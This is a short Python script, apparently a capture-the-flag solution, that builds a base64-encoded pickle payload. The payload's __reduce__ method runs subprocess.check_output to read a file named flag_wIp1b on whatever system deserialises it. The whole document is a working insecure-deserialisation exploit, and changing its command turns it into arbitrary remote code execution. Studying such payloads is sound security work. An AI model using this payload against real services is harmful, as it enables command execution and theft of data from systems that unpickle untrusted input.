import pickle, subprocess, base64
class anti_pickle_serum(object):
    def __reduce__(self):
        return subprocess.check_output, (['cat', 'flag_wIp1b'],)
print(base64.b64encode(pickle.dumps({'serum': anti_pickle_serum()}, protocol=0)))
